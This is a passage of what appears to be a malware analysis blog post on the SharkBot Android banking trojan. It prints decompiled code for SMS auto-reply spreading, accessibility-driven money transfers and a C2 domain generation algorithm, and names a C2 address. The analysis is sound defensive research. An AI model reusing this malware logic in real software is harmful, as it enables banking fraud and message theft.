<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Technical analysis of SharkBot android malware - muha2xmad</title>
<meta name="description" content="بسم الله الرحمن الرحيم  ">


  <meta name="author" content="Muhammad Hasan Ali">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="muha2xmad">
<meta property="og:title" content="Technical analysis of SharkBot android malware">
<meta property="og:url" content="https://muha2xmad.github.io/malware-analysis/sharkbot/">


  <meta property="og:description" content="بسم الله الرحمن الرحيم  ">



  <meta property="og:image" content="https://muha2xmad.github.io/assets/images/MA/sharkbot/shark.jfif">





  <meta property="article:published_time" content="2022-09-06T00:00:00+00:00">





  

  


<link rel="canonical" href="https://muha2xmad.github.io/malware-analysis/sharkbot/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Muhammad Hasan Ali",
      "url": "https://muha2xmad.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="yjK5jUGtGuvD9i_1SEaec8FrngezWj1KJqBbPuPRAQM" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="muha2xmad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site/lo.png">
<!-- <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site/lo.png"> -->
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site/lo.png" alt=""></a>
        
        <a class="site-title" href="/">
          muha2xmad
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Malware-analysis">Malware analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Mal-Document">Mal Documents</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site/ed.jpg" alt="Muhammad Hasan Ali" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Muhammad Hasan Ali</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://twitter.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/muhammadhasanali/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Technical analysis of SharkBot android malware">
    <meta itemprop="description" content="بسم الله الرحمن الرحيم">
    <meta itemprop="datePublished" content="2022-09-06T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Technical analysis of SharkBot android malware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  12 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#technical-review">Technical review</a></li>
  <li><a href="#auto-direct-reply">Auto Direct Reply</a></li>
  <li><a href="#automatic-transfer-systems-ats">Automatic Transfer Systems ATS</a></li>
  <li><a href="#domain-generation-algorithm-dga">Domain Generation Algorithm DGA</a></li>
  <li><a href="#classic-features">Classic features</a>
    <ul>
      <li><a href="#overlay-attack">Overlay attack</a></li>
      <li><a href="#steal-sms">Steal SMS</a></li>
      <li><a href="#keylogging">Keylogging</a></li>
      <li><a href="#intercept-sms">Intercept SMS</a></li>
      <li><a href="#commands">Commands</a></li>
    </ul>
  </li>
  <li><a href="#communication-with-c2">Communication with C2</a></li>
  <li><a href="#anti-emulator">Anti-emulator</a></li>
  <li><a href="#ioc">IoC</a></li>
  <li><a href="#article-quote">Article quote</a></li>
  <li><a href="#ref">REF</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>بسم الله الرحمن الرحيم</strong></p>

<p><strong>FreePalestine</strong></p>

<h1 id="introduction">Introduction</h1>

<p>In this blog, we will talk about SharkBot android malware. SharkBot is  found at the end of October 2021 by the Cleafy Threat Intelligence Team. The malware comes with classic features such as stealing SMS, stealing contacts, abusing accessibility service, overlay attack ,and intercept received SMS. And comes with new techniques such as ATS which enables the malware to transfer money by auto-filling fields in legitimate banking apps and initate money transfers. And Auto Direct reply technique this enables the malware to spread more. When a message comes to the user and the user reply to the message through the notification not through entering the messageing app this called Direct reply. The malware can intercept the received messages notification and auto direct reply with a malicious link to download a malicous app. But in newer versions of SharkBot, Auto direct reply is not implemented.</p>

<p>In this article, we will analyze two sample because we will explain Auto direct reply which is not implemented in newer versions of the malware. And we will analyze new version of SharkBot sample which has ATS technique and other techniques.</p>

<h1 id="technical-review">Technical review</h1>

<p>SharkBot version: This version of SharkBot is <code class="language-plaintext highlighter-rouge">2.6</code>.</p>

<p>Auto direct reply: The malware will try to intercept message notificaion and reply to it with a malicious message contain malicous link to download malicous APK.</p>

<p>Automatic Transfer Systems: allows the attacker to auto-fill fields of banking apps and initate money transfers.</p>

<p>Domain Generation Algorithm: is used by attackers to create random domain names for C2 servers to prevent blocking their communication with C2 servers.</p>

<p>Classic features: features that any android mlaware will have such as steal SMS, steal contacts, overlay attack, keylogging, and steal Cookies.</p>

<p>Anti-emulator: it checks if it’s installed on an emulator or not. If the emulator is detected, then the app won’t launch and it won’t communicate with the C2 server.</p>

<p>Presistence: After the malware is install, the malware will ask for <code class="language-plaintext highlighter-rouge">Accessbility service</code>. Then the malware will hide its icon and if you try to uninstall, it goes to Homescreen.</p>

<p>This version of SharkBot is <code class="language-plaintext highlighter-rouge">2.6</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span> <span class="n">I</span> <span class="p">=</span> <span class="s">"release"</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span> <span class="n">M</span> <span class="p">=</span> <span class="s">"com.ohalqpdj.discopet"</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="n">boolean</span> <span class="n">b</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">c</span> <span class="p">=</span> <span class="m">6</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span> <span class="n">j</span> <span class="p">=</span> <span class="s">"2.6"</span><span class="p">;</span>

</code></pre></div></div>

<h1 id="auto-direct-reply">Auto Direct Reply</h1>

<p><strong>Note:</strong> auto reply is implemented in old samples. Download from <a href="https://bazaar.abuse.ch/sample/d05fb8c6899c96d1519e46eaea848ead6a17c7ddd0e20228e83c1aa9f264011d/">malwarebazaar</a></p>

<p>This feature of Direct Reply is to enable the user to reply to the incomming message through the notification of the message not entering the app itself. The malware abuses this feature to auto send a malicous link to other users by repling to the message with a malicious link to download a malicous APK which in our case will download SharkBot dropper.</p>

<p align="center">
  <img src="/assets/images/MA/sharkbot/1.png" />
</p>
<center><font size="3"> <u>Figure</u>(1) Show what is direct reply - photo from stackoverflow<u></u> </font></center>
<p><br /></p>

<p>The malware will first intercept the notifications of comming SMSs then auto reply to them with a message. This message is received from C2 server contains malicuos link to download malcious APK.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">void</span> <span class="nf">onNotificationPosted</span><span class="p">(</span><span class="n">StatusBarNotification</span> <span class="n">statusBarNotification</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">statusBarNotification</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">a</span> <span class="n">aVar</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="n">f2719e</span> <span class="p">=</span> <span class="n">aVar</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">()</span> <span class="p">-</span> <span class="n">Long</span><span class="p">.</span><span class="nf">parseLong</span><span class="p">(</span><span class="n">aVar</span><span class="p">.</span><span class="nf">r</span><span class="p">(</span><span class="nf">getString</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="kt">string</span><span class="p">.</span><span class="n">app_name</span><span class="p">),</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">())))</span> <span class="p">&gt;=</span> <span class="m">10800000</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">r</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">f2719e</span><span class="p">.</span><span class="nf">r</span><span class="p">(</span><span class="s">"autoReply"</span><span class="p">,</span> <span class="s">"{}"</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">packageName</span> <span class="p">=</span> <span class="n">statusBarNotification</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">();</span>
                <span class="n">d</span><span class="p">.</span><span class="n">j</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">a</span> <span class="n">a</span> <span class="p">=</span> <span class="nf">a</span><span class="p">(</span><span class="n">statusBarNotification</span><span class="p">.</span><span class="nf">getNotification</span><span class="p">(),</span> <span class="n">packageName</span><span class="p">);</span>
                <span class="n">Bundle</span> <span class="n">bundle</span> <span class="p">=</span> <span class="n">statusBarNotification</span><span class="p">.</span><span class="nf">getNotification</span><span class="p">().</span><span class="n">extras</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(!(</span><span class="n">bundle</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">a</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">packageName</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">r</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"{}"</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">String</span> <span class="n">b2</span> <span class="p">=</span> <span class="nf">b</span><span class="p">(</span><span class="n">packageName</span> <span class="p">+</span> <span class="n">bundle</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"android.title"</span><span class="p">));</span>
                    <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">jSONObject</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="s">"all"</span><span class="p">)</span> <span class="p">||</span> <span class="n">jSONObject</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="n">packageName</span><span class="p">))</span> <span class="p">{</span>
                        <span class="kt">long</span> <span class="n">parseLong</span> <span class="p">=</span> <span class="n">Long</span><span class="p">.</span><span class="nf">parseLong</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">f2719e</span><span class="p">.</span><span class="nf">r</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span> <span class="s">"0"</span><span class="p">));</span>
                        <span class="k">if</span> <span class="p">(!</span><span class="k">this</span><span class="p">.</span><span class="n">f2718d</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">b2</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">()</span> <span class="p">-</span> <span class="n">parseLong</span> <span class="p">&gt;</span> <span class="m">43200000</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">this</span><span class="p">.</span><span class="n">f2718d</span> <span class="p">=</span> <span class="n">b2</span><span class="p">;</span>
                            <span class="n">a</span><span class="p">.</span><span class="nf">j</span><span class="p">(</span><span class="nf">getApplicationContext</span><span class="p">(),</span> <span class="n">jSONObject</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="s">"all"</span><span class="p">)</span> <span class="p">?</span> <span class="n">jSONObject</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"all"</span><span class="p">)</span> <span class="p">:</span> <span class="n">jSONObject</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">packageName</span><span class="p">));</span>
                            <span class="k">this</span><span class="p">.</span><span class="n">f2719e</span><span class="p">.</span><span class="nf">z</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">()));</span>
                            <span class="nf">cancelNotification</span><span class="p">(</span><span class="n">statusBarNotification</span><span class="p">.</span><span class="nf">getKey</span><span class="p">());</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">this</span><span class="p">.</span><span class="n">f2719e</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>After the malware intercept the notification, the malware will receive a command <code class="language-plaintext highlighter-rouge">AutoReply</code> to reply to the notification with a message contains a malicicous link. This link could be a shorten link such as <code class="language-plaintext highlighter-rouge">Bit.ly</code> link.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c2</span> <span class="p">==</span> <span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">jSONObject</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="s">"autoReply"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"status"</span><span class="p">,</span> <span class="s">"notify"</span><span class="p">);</span>
                                <span class="n">d</span><span class="p">.</span><span class="n">j</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">a</span> <span class="n">aVar2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">d</span><span class="p">.</span><span class="n">j</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">x</span><span class="p">);</span>
                                <span class="n">aVar2</span><span class="p">.</span><span class="nf">z</span><span class="p">(</span><span class="s">"autoReply"</span><span class="p">,</span> <span class="n">jSONObject</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"autoReply"</span><span class="p">));</span>
                                <span class="n">aVar2</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                <span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"status"</span><span class="p">,</span> <span class="s">"skip"</span><span class="p">);</span>
                                <span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"skip"</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">());</span>
                            <span class="p">}</span>
                            <span class="n">s</span> <span class="n">sVar3</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">;</span>
                            <span class="n">sVar3</span><span class="p">.</span><span class="nf">g0</span><span class="p">(</span><span class="n">sVar3</span><span class="p">.</span><span class="n">s</span><span class="p">);</span>
                            <span class="n">s</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">r</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
                        <span class="p">}</span>
</code></pre></div></div>

<h1 id="automatic-transfer-systems-ats">Automatic Transfer Systems ATS</h1>

<p><strong>Note</strong>: other sections is from new samples download from <a href="https://tria.ge/220906-w626tseffn">hatching triage</a></p>

<p>Automatic Transfer Systems <code class="language-plaintext highlighter-rouge">ATS</code> is an advanced technique which allows the attacker to auto-fill fields of banking apps and initate money transfers. This happens when the malware abuses the <code class="language-plaintext highlighter-rouge">Accessbility service</code> which allows the attacker to get the content of the window and enables the attacker to click/touch and insert text into text field.</p>

<p align="center">
  <img src="/assets/images/MA/sharkbot/2.png" />
</p>
<center><font size="3"> <u>Figure</u>(2) Show how Sharkbot preforms ATS - photo from cleafy<u></u> </font></center>
<p><br /></p>

<p>When the victim opens a banking app, the malware will get notified through revceiving an array of events such as <code class="language-plaintext highlighter-rouge">clicks/touches</code>, <code class="language-plaintext highlighter-rouge">button presses</code>, <code class="language-plaintext highlighter-rouge">gestures</code> to be simulated in an specific order. Then the malware will simulate the interation of the victim with the banking information to do the money transfers as if the malware is the user himself.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">void</span> <span class="nf">m</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">d</span><span class="p">();</span>
            <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="n">a</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="n">s</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">this</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONArray</span><span class="p">(</span><span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="s">"[{\"action\":\"CLICK\",\"nodes\":[{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">L</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">F</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">L</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"getparent\":1,\"getparentClickable\" : true, \"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">F</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"getparent\":1,\"getparentClickable\" : true, \"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">L</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"get\":1,\"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">F</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"get\":1,\"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">L</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"get\":1,\"getparent\":1,\"getparentClickable\" : true, \"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"text\",\"data\":\""</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">F</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"\",\"get\":1,\"getparent\":1,\"getparentClickable\" : true, \"attr\":{\"isClickable\":true},\"stopNext\":true},{\"search\":\"id\",\"data\":\"android:id/button1\",\"attr\":{\"isClickable\":true,\"isEnabled\":true}},{\"search\":\"id\",\"data\":\"com.android.settings:id/button1\",\"attr\":{\"isClickable\":true,\"isEnabled\":true}},{\"search\":\"id\",\"data\":\"com.android.packageinstaller:id/permission_allow_button\",\"attr\":{\"isClickable\":true,\"isEnabled\":true}},{\"search\":\"id\",\"data\":\"com.android.permissioncontroller:id/permission_allow_button\",\"attr\":{\"isClickable\":true,\"isEnabled\":true}}]},{\"global\":\"HOME\",\"event\":\"TYPE_WINDOW_CONTENT_CHANGED\"}]"</span><span class="p">).</span><span class="nf">toString</span><span class="p">());</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">this</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONArray</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<h1 id="domain-generation-algorithm-dga">Domain Generation Algorithm DGA</h1>

<p>In this sample, it has a hard-coded C2 server link  <code class="language-plaintext highlighter-rouge">http://f3eac8de096e59ca.live/</code>, but what happens if the C2 server is down? Here comes the role of DGA. DGA technique is used by attackers to create random domain names for C2 servers to prevent blocking their communication with C2 servers. Hard-coded C2 servers are easy to block or taken down but DGA is hard to block or taken down. In this version of SharkBot, the malware uses <code class="language-plaintext highlighter-rouge">MD5</code> to generate domain names, <code class="language-plaintext highlighter-rouge">get(3)</code> to get the current week of the current year, <code class="language-plaintext highlighter-rouge">get(1)</code> to get the current year.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">private</span> <span class="n">String</span> <span class="nf">m</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
            <span class="n">Calendar</span> <span class="n">calendar0</span> <span class="p">=</span> <span class="n">Calendar</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">();</span>
            <span class="n">String</span><span class="p">[]</span> <span class="n">arr_s</span> <span class="p">=</span> <span class="s">".xyz,.live,.com,.store,.info,.top,.net"</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">","</span><span class="p">);</span>
            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="n">v</span> <span class="p">&lt;</span> <span class="n">arr_s</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">arr_s</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
                <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">aa</span><span class="p">.</span><span class="nf">m</span><span class="p">().</span><span class="nf">m</span><span class="p">(</span><span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">s</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">calendar0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="m">3</span><span class="p">)).</span><span class="nf">toString</span><span class="p">())</span> <span class="p">+</span> <span class="n">calendar0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="m">1</span><span class="p">);</span> <span class="c1">//generate domain names</span>
                <span class="p">++</span><span class="n">v</span><span class="p">;</span>
                <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">",http://"</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="n">s1</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">16</span><span class="p">)).</span><span class="nf">append</span><span class="p">(</span><span class="n">s</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"/"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">toString</span><span class="p">().</span><span class="nf">toLowerCase</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s">""</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<h1 id="classic-features">Classic features</h1>

<p>Classic features are features that any android mlaware will have such as steal SMS, steal contacts, overlay attack, keylogging, and steal Cookies.</p>

<h2 id="overlay-attack">Overlay attack</h2>

<p>The malware will perform overlay attack when the victim opens a specific app usually banking apps or cryptocurrency apps to steal the victim’s credentials.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span> <span class="n">bundle0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">String</span> <span class="n">s</span><span class="p">;</span>
